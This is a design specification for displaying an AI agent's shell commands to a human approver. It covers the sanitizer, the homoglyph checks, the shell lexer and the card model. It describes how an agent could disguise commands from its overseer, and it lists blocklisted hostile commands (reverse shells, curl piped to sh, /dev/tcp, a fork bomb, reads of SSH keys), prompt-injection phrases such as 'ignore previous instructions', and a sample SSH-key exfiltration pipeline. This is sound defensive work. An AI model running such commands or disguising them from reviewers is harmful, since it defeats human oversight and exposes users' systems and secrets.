# Showing a card: what the human sees before signing

A signature covers the digest of the exec envelope (README, section 3), so nobody can swap the
command under a signature. The approval is only as good as the human's reading of the card,
though: an agent that controls `argv` can try to make a dangerous command *look* harmless.
This document fixes one way of turning an envelope into what a person reads, so that the phone
app, the Apple Watch and `wardenctl` show the same thing and are tested against the same vectors.

Everything here is **display only**. The digest, the ticket and its signing string are computed
over the envelope exactly as it is; nothing below changes a single signed byte.

Implementations: `app/src/core/display.ts` (reference; TypeScript), `daemon/cmd/wardenctl/display.go`
(Go), `app/targets/watch/Protocol/Display.swift` (Swift). Vectors:
[`vectors/display_vectors.json`](vectors/display_vectors.json), generated from the reference by
`app/scripts/gen-display-vectors.mjs` and reviewed by hand (the vectors are part of this spec).

All processing is over Unicode code points (scalars), never bytes or UTF-16 units.

## 1. Signed facts and everything else

A client presents a card in two visually separate blocks:

- **Signed facts**: fields of the envelope, covered by the digest: `argv` (as parts, section 7,
  and in full), `exe`, `cwd`, `uid`/`gid`, `env` (the Environment block, section 7a), `ppidChain`,
  `requester.host`, and the expiry of the
  record (on the direct wardend transport the whole response is signed by the supervisor).
- **Not signed**: the explanation, risk and verdict of any model (the app's judge, a local model,
  `meta.judge`/`meta.opinion`), and every `meta.*` field (`class`, `rule`, `delegating`,
  `insideRoot`, `hardware`). `meta` is not in the digest; on the OpenClaw relay path the gateway
  sets it. Clients show `meta` as unconfirmed and never use it to *lower* caution (it may only
  add some: `hardware.required` disables allow without a key, and wardend checks the key itself).

Every string shown from the envelope goes through the sanitizer (section 2). The full `argv`
must always be reachable (expanded card on the phone, the card screen on the watch,
`wardenctl show`), even when the headline folds a wrapper (section 6).

Every exec card of wardend is a root or a delegating launch (a ticket is requested only for
those), so an approval covers everything the command starts while it runs. Clients say so on the
card, together with the expiry and "no answer means deny".

## 2. Sanitizer

Each code point belongs to one class (ranges are inclusive; `vectors.classes` is the same table):

| class | code points | shown as | flag | for rules (section 5) |
|---|---|---|---|---|
| `lf` | U+000A | `⏎` | none | `\n` |
| `tab` | U+0009 | `⇥` | none | space |
| `ctrlSpace` | U+000B–000D, U+0085, U+2028–2029 | marker | `control` | space |
| `ctrl` | U+0000–0008, U+000E–001F, U+007F–0084, U+0086–009F, lone surrogates | marker | `control` | removed |
| `bidi` | U+061C, U+200E–200F, U+202A–202E, U+2066–2069 | marker | `bidi` | removed |
| `oddSpace` | U+00A0, U+1680, U+2000–200A, U+202F, U+205F, U+3000 | marker | `invisible` | space |
| `invisible` | every other Cf of Unicode 15.1 (U+00AD, U+0600–0605, U+06DD, U+070F, U+0890–0891, U+08E2, U+180E, U+200B–200D, U+2060–2064, U+206A–206F, U+FEFF, U+FFF9–FFFB, U+110BD, U+110CD, U+13430–1343F, U+1BCA0–1BCA3, U+1D173–1D17A, U+E0001, U+E0020–E007F) and the invisible letters and marks U+034F, U+115F–1160, U+17B4–17B5, U+180B–180F, U+2800, U+3164, U+FFA0 | marker | `invisible` | removed |
| (none) | everything else | itself | none | itself |

The marker is `⟨U+` + the code point in uppercase hex, at least 4 digits + `⟩`, for example
`⟨U+202E⟩`, `⟨U+E0041⟩`. The sanitizer returns the text and the set of flags it raised.
Variation selectors (U+FE00–FE0F) are not flagged: emoji use them and they cannot hide text.

## 3. Homoglyphs

A look-alike letter deceives where the reader recognises a familiar Latin name: a word that looks
Latin but carries a Cyrillic or Greek letter (`pаypal`, `/etc/pаsswd`), and the program that will
run. A name written wholly in one alphabet reads as what it is. Russian folder and file names are
everyday data (`/srv/media/Сериалы/Северный маяк/Сезон 2/…`), so they raise no flag: a flag that fires
on ordinary work turns the dangerous card into the normal one and stops meaning anything.

Alphabet groups (`vectors.scripts`, as `[from, to, group]`): Latin (U+0041–005A, U+0061–007A,
U+00C0–00D6, U+00D8–00F6, U+00F8–024F, U+1E00–1EFF), Greek (U+0370–03FF, U+1F00–1FFF), Cyrillic
(U+0400–052F, U+1C80–1C8F, U+2DE0–2DFF, U+A640–A69F), Armenian (U+0531–058F), Cherokee
(U+13A0–13FF, U+AB70–ABBF), fullwidth Latin (U+FF21–FF3A, U+FF41–FF5A). Combining marks
(`vectors.marks`: U+0300–036F, U+1AB0–1AFF, U+1DC0–1DFF, U+20D0–20FF, U+FE20–FE2F) have no group.

- `mixedScript`: a run of letters mixes two or more groups. A run is a maximal sequence of code
  points that are letters of the groups or combining marks; every other code point ends it
  (digits, punctuation, `/`, `.`, `-`, `_`, spaces, quotes). So the check works inside one path
  segment and inside one word of a segment: `media/Сериалы`, `Северный маяк (2019) - Directors Cut.mkv`
  and `7Б` are not mixed, `pаypal`, `/usr/bin/pуthon` and `Nоrthern.Lighthouse` with a Cyrillic
  letter are. A combining mark continues the run of the letter before it, so a mark between a
  Latin and a Cyrillic letter does not split a mixed word, and Cyrillic in decomposed form
  (`е` + U+0308, as file names synced from a Mac may be) stays one alphabet. Checked on every
  `argv` element, every part of a script and the program paths below.
- `nonAsciiPath`: the path of the program contains a code point above U+007F: `exe`, `argv[0]`
  and each `ppidChain[].exe`, each as a whole string. A program name has no reason to be
  non-ASCII, and a look-alike written wholly in one alphabet (`сс` in Cyrillic for `cc`) is not
  mixed, so here any non-ASCII code point is enough.

What this leaves unflagged: a word written wholly in Cyrillic or Greek look-alikes outside the
program path (a host name like `аррӏе.com`, a script's command `рір` found through `PATH`). The
rules and the model still see the text; running a look-alike program through `PATH` gives an agent
nothing it could not get by shadowing the real name in a directory it controls.

**Where the letter is.** The flag alone says that some word mixes alphabets, not which one, and
`Nоrthern` on a screen reads as `Northern`. So every mixed run is also returned with its place and its odd
letters (`mixed`, section 7), counted in code points of the text *as shown*, after the sanitizer
(section 2): a marker `⟨U+XXXX⟩` before or inside a run shifts the positions by its length.

- `at`: the index of the run's first code point in the shown text;
- `word`: the run as shown;
- `among`: the run's main alphabet: the group with the most letters in it; of groups with equally
  many letters, the one whose first letter comes first;
- `odd`: the letters of the other groups in order, each `{at, char, script}`: its index in `word`,
  the letter and its group.

Group names (`vectors.scriptNames`, in group order): `latin`, `greek`, `cyrillic`, `armenian`,
`cherokee`, `fullwidth`. `Nоrthern` with a Cyrillic `о` is `among: latin, odd: [{at: 1, char: "о",
script: cyrillic}]`; `Cезон` with a Latin `C` is `among: cyrillic` with the `C` odd; `pаypаl` has two
odd letters.

## 4. Splitting a shell command into parts

A simple lexer, nothing is expanded or run. It walks the script and cuts parts at the operators
`;` `&&` `||` `|` `|&` (as `|`) `&` and at newlines, outside of:

- `'…'` (to the next `'`), `"…"` and `` `…` `` (a backslash escapes the next code point);
- `$(…)`, `<(…)`, `>(…)` (balanced parentheses, quotes inside respected);
- a backslash and the code point after it (so `\` + newline continues the line);
- a comment: `#` at the start of a word, up to (not including) the newline;
- a here-document: after `<<WORD` / `<<-WORD` (not `<<<`; the word may be quoted), the body
  lines up to the line equal to `WORD` (leading tabs stripped for `<<-`) belong to the part,
  which ends after the terminator line.

`&` right after `<` or `>` (`2>&1`, `>&2`), `&>` and `>|` are redirections, not operators.
An unterminated quote or parenthesis runs to the end of the script. Each part is trimmed of
ASCII whitespace; empty parts are dropped. A part records the operator that follows it (`sep`:
`;` `&&` `||` `|` `&`, newline, or empty for the last one).

## 5. Rules

### 5.1 Text for rules

Rules run on a normalized text: `lf` stays a newline; `tab`, `ctrlSpace`, `oddSpace` and the space
become one space; the other flagged classes are removed (so `r⟨U+200B⟩m` is `rm`); `'`, `"` and
`\` are removed (so `"$HOME"/.ssh` is `$HOME/.ssh`); A–Z, А–Я and Ё become lowercase; runs of
spaces collapse to one. Patterns are written for this text, in lowercase.

### 5.2 Regular expressions

The patterns use a subset that behaves the same in ECMAScript (without flags), RE2 (Go) and Swift
Regex: literals, classes, groups, alternation, `* + ? {m,n}` and their lazy forms, `^`/`$`
(whole text), `\b \s \S \w \W \d`, `.` (not a newline). No lookaround, no backreferences.
`\w` and `\b` are ASCII (`[A-Za-z0-9_]`); in Swift the regex is built with
`asciiOnlyWordCharacters()`, `wordBoundaryKind(.simple)` and `matchingSemantics(.unicodeScalar)`.
A rule matches if its pattern is found anywhere in the text.

### 5.3 Table

`vectors.rules` holds the patterns; every implementation carries the same list in the same order
and checks it against the file. Kind `block` is the blocklist, `injection` is text addressed to
the reviewer. Ids and what they catch:

| id | catches |
|---|---|
| `rm-rf` | recursive `rm` of `/`, `~`, `$HOME`, `/home[/user]`, `/root`, `/etc`, `/usr`, `/var`, `/boot`, `/bin`, `/sbin`, `/lib*`, `/opt`, `/srv`, `/mnt[/x]`, `/media` |
| `mkfs` | `mkfs*`, `mke2fs`, `mkswap`, `wipefs`, `sfdisk`, `cfdisk`, `sgdisk`, `blkdiscard` |
| `dd` | `dd … of=/dev/<disk>` |
| `curl-sh` | download piped into a shell |
| `pipe-shell` | anything piped into a shell (`… \| sh`, `\| sudo bash`, `\| /bin/sh`) |
| `exec-dynamic` | code assembled at run time: `eval $…`, `sh -c "$(…)"`, `source <(…)` |
| `decode` | `base64 -d`, `xxd -r` |
| `netcat` | `nc`, `ncat`, `netcat`, `socat`, `telnet` as commands, `/dev/tcp`, `/dev/udp` |
| `reverse-shell` | `socket` … `.connect(`, `sh -i`, `pty.spawn` |
| `chmod-root` | recursive `chmod`/`chown`/`chgrp` of `/` or a system directory |
| `shutdown` | `shutdown`, `reboot`, `poweroff`, `halt`, `init 0/6` |
| `gateway-stop` | `systemctl [--user] stop/restart/disable/mask/kill …openclaw…` |
| `openclaw-json`, `openclaw-cli`, `openclaw-secrets` | the OpenClaw config, its config/secrets/devices/update commands, its secrets and databases |
| `secrets` | the words secret, token, password, passwd, api key, private key |
| `ssh` | `/etc/shadow`, `/etc/sudoers`, `~/.ssh`, `.ssh/id_*`, `authorized_keys` |
| `sudo` | `sudo`, `doas`, `pkexec` |
| `fork-bomb` | `:(){ :\|:& };:` |
| `firewall` | `iptables`/`ip6tables`/`nft`/`ufw` flush, reset or disable |
| `crontab` | `crontab -r` |
| `git-force` | `git push --force`, `-f`, `+refspec` |
| `injection` | "ignore previous instructions", "you are an AI/reviewer", "approve this", "allow-once", `decision: allow` / `decision=allow`, "this command is safe", "pre-approved", "note to the reviewer", "reviewer note", and the Russian equivalents |

Clients may add local rules (the app has an optional `trash-put` rule); the shared table is the
minimum. The table is a tripwire, not a guarantee: a command that matches nothing is not
thereby safe.

### 5.4 Delegating launches

`vectors.delegating`: groups of program names, the same as `delegating` in
`daemon/policy/defaults.json`. A card is a delegating launch if the base name of `exe` or of
`argv[0]` is in a group; the first matching group (table order) is reported. This is computed from
signed fields, not taken from `meta.class`.

## 6. Forms of a command

**claude-cli wrapper** (`form: "wrapper"`). Claude Code runs every Bash tool call as

```
["…/bash", "-c", "source SNAP 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval WORD[ < /dev/null] && pwd -P >| CWDFILE"]
```

(taken from real wardend journals; ` < /dev/null` is absent when the command has a
here-document). It is folded to the command inside `eval` only if **all** of this holds, byte for
byte: `argv` has exactly 3 elements, the base name of `argv[0]` is `bash`, `argv[1]` is `-c`, and
`argv[2]` is exactly the text above where

- `SNAP` matches `^/[A-Za-z0-9._/-]+$`, its directory's base name is `shell-snapshots` and its
  base name matches `^snapshot-bash-[0-9]+-[a-z0-9]+\.sh$`;
- `WORD` is one or more `'…'` segments, the first one first, joined only by `"'"` (which stands for
  one `'`); its value is the concatenation;
- `CWDFILE` matches `^/[A-Za-z0-9._/-]+$` and its base name matches `^claude-[0-9a-f]+-cwd$`;
- nothing else, before or after.

Anything else is not folded: the whole script is shown (below). An `eval '…'` anywhere else in a
script is never special. The folded card says "inside the claude-cli wrapper" and still offers the
full `argv`. The sourced snapshot file is not shown (like any script file a command runs).

**Shell script** (`form: "shell"`): `argv` has exactly 3 elements, the base name of `argv[0]` is
one of `sh bash dash zsh ksh ash`, and `argv[1]` matches `^-[eilux]*c[eilux]*$`. The script
`argv[2]` is shown. With more elements (`bash -c '…' arg0 arg1…`, where the script can run its
arguments) the command is shown as argv.

**argv** (`form: "argv"`): everything else. The command is `argv` shell-quoted: an element
matching `^[A-Za-z0-9_@%+=:,./-]+$` as is, any other in `'…'` with `'` written as `'\''`
(an empty element is `''`), joined by spaces. It is one part.

## 7. The card model

`commandView(argv, exe, cwd, chain)` returns (field names as in the vectors):

- `form`, `wrapper` (`"claude-cli"` or null), `shell` (base name of `argv[0]` for the wrapper and
  shell forms, else null), `command` (the folded command, the script, or the quoted argv; raw,
  not sanitized);
- `parts`: for the wrapper and shell forms, the parts of `command` (section 4); for argv, one part
  (none for an empty `argv`). Each part has `text` (sanitized), `sep`, `danger` (rule ids matching
  the part's normalized text, in table order), `flags` (sanitizer flags of the part plus its
  `mixedScript`; for the argv form also the `mixedScript` of every element and the program flags
  of `argv[0]`, section 3) and `mixed` (the mixed runs of the part's raw text, for the argv form of
  `command`, section 3; positions in `text`);
- `danger`: rule ids matching the whole normalized `command` (wrapper, shell) or, for argv, the
  normalized `argv` joined by spaces and the same with `argv[0]` replaced by the base name of `exe`
  (`exec -a innocent rm -rf /` is still `rm -rf /`); in table order. For argv, the single part's
  `danger` is this list;
- **attribution**: for every id in `danger` that no part has, the pipelines (runs of parts joined by
  `|`, two or more parts) are tested with their parts' normalized texts joined by ` | `; every part
  of a matching pipeline gets the id (`curl … | sh` marks both parts). An id no pipeline explains
  (for example the fork bomb) makes every part visible;
- `flags`: sanitizer flags and `mixedScript` of every `argv` element; the program flags (sanitizer,
  `mixedScript`, `nonAsciiPath`) of `argv[0]`, of `exe` and of each `ppidChain[].exe`; and the
  sanitizer flags of `cwd`; in the order `control, bidi, invisible, mixedScript, nonAsciiPath`;
- `mixed`: the mixed runs behind the card's `mixedScript` flag: of every `argv` element, of `exe`
  and of each `ppidChain[].exe`, in this order, each as `{word, among, odd}` (section 3; no `at`,
  the field is not named); a run equal to an earlier one in all three is dropped (the same program
  in `argv[0]` and `exe`);
- `delegating`: the group id (section 5.4) or null;
- `dangerous`: `danger` or `flags` is non-empty or `delegating` is set;
- `visible`: the parts a collapsed card shows. All of them if there are at most 4 or a rule was
  not attributed; otherwise the first two, the last one, every part of a chain that has a part
  with `danger` or `flags`, and every part whose normalized text contains the word `eval` (a
  command inside a string). A chain is a run of parts joined by `|` (and `|&`), `&&` or `||`;
  `;`, `&` and a newline end it, and so does the end of the script, even after an operator. So in
  `tar cz ~/.ssh | base64 | nc x 443` the `base64` between two risky parts stays visible, while a
  chain without a risky part may still fold, also next to a risky one after `;`. `hidden` is the
  number of the others, which are therefore never risky and never stand in a chain with a risky
  part. A collapsed card shows "N more" in place of each run of hidden parts (not once at the end:
  visible parts must not read as one contiguous command) and never truncates a risky part;
- `headline`: the first visible part with `danger` or `flags`, else the first visible part with
  `eval`, else 0; null without parts. One-line surfaces (lists, notifications, the decision toast)
  show this part and `(+N)` for the rest.

## 7a. The Environment block

`envView(env)` returns `{entries, loader, dangerous}`:

- `entries`: one per `env` entry, in order: `name` and `value` sanitized (section 2), `cut` (0 when
  absent), `flags` (the sanitizer flags of the name and of the value, then `truncated` when `cut` >
  0, then `duplicate` when the raw name occurs more than once in `env`; in the order `control, bidi,
  invisible, truncated, duplicate`), `loader` (the raw name is `LD_PRELOAD`, `LD_AUDIT` or
  `LD_LIBRARY_PATH` and the raw value is not empty);
- `loader`: the distinct names of entries with `loader`, in order of first appearance;
- `dangerous`: some entry has `loader` or a flag.

A card with a dangerous `envView` is dangerous (section 8), with the reasons in words: the loader
variable by name ("code of another library runs inside the program, however harmless the command
looks"), a cut value, a name set twice, hidden characters. With a non-empty `loader` no automatic
approver (the app's autopilot or judge) may allow the card: only the human, and the card says why.
This rule reads the signed `env`, never `meta` (wardend also reports the category `loader-env` and
`meta.loaderEnv`, as hints).

The block is titled "Environment" and shown whenever `env` is not empty, next to
the command among the signed facts. A collapsed card shows the entries with `loader` or a flag in
full and "N more" for the rest; all of them stay reachable: the expanded card on the phone, "N more"
on the watch, `wardenctl show <id>` (and `d` in `wardenctl watch`). A cut value ends with "… (+N)" in the client's words. A long value may
fold on screen, but all of it (up to 1024 code points) must be reachable. The judge gets `env` as
untrusted text written by the agent, like `argv`.

## 8. What clients do with it

- A **dangerous** card (the model's `dangerous`, or a local rule, or `meta` saying it needs more
  care) is marked (the app: red frame and the reasons in words; `wardenctl`: `!!! DANGEROUS`), "Deny"
  is the primary action and "Allow" needs a deliberate gesture (a 1.5 s hold on the phone; the
  watch always requires a hold or the Digital Crown). Rules and the injection detector run locally
  in every mode, also when no model is called.
- **No rating is not a rating.** Without a model verdict (manual mode, no model configured, a
  model error) the card shows a neutral "not rated" with the reason, never a red maximum.
  Deterministic rules are shown as such, not as a model score, and the text that comes with a rule
  is labelled as being about the rule ("why it fired"), not as what the command does (the model's).
- **Where the letter is.** `mixedScript` is shown by the word, not by the flag alone. In the
  command the client marks the odd letter itself where it stands (with the combining marks after
  it): the phone with a background and an underline and the alphabet in a small label after it
  (`о⟨Cyr.⟩`), the watch and `wardenctl` with the label as text (`Nо⟨Cyr.⟩rthern`). The reason names the
  word and the letter: "In the word \"Nоrthern\" a Cyrillic \"о\" among Latin letters", for up to three words and then their number.
- The judge (remote or on-device) gets the full sanitized `argv`, the form, and the parts, and the
  prompt marks all of it as untrusted text written by the agent.

## 9. Vectors

`vectors/display_vectors.json`:

| key | contents |
|---|---|
| `flags`, `classes`, `scripts`, `scriptNames`, `marks`, `rules`, `delegating` | the tables of sections 2, 3, 5.3, 5.4 (implementations compare their copies) |
| `sanitize` | input, sanitized text, flags |
| `normalize` | input, text for rules |
| `tokenFlags` | input, its `mixedScript` and its mixed runs `mixed` (section 3; the name is historical, there are no words) |
| `lex` | script, parts as `[raw, sep]` (before sanitizing) |
| `cases` | `input` (`argv`, `exe`, `cwd`, `chain`) and the full `expect` of section 7 |
| `env` | `input` (an `env` array of the envelope) and the full `expect` of section 7a |

The cases include the attacks this document exists for: an `eval` inside `bash -c` next to a
reverse shell, fake claude-cli wrappers with extra commands, RTL override, zero-width characters
splitting a blocklisted word, a long command with the dangerous part in the tail, a safe stage
between two risky ones in a pipeline or an `&&` chain, base64 piped into a shell, homoglyphs in a
path, in a segment next to Russian folders and in `exe`/`argv[0]` (`/usr/bin/pуthon`), with their
positions after an emoji and after markers, and `exec -a` disguise; and the everyday cases that
must stay quiet or fold, such as Russian folder and file names and a long safe pipeline. Strings
in the file escape every flagged code point and every combining mark as `\uXXXX`.
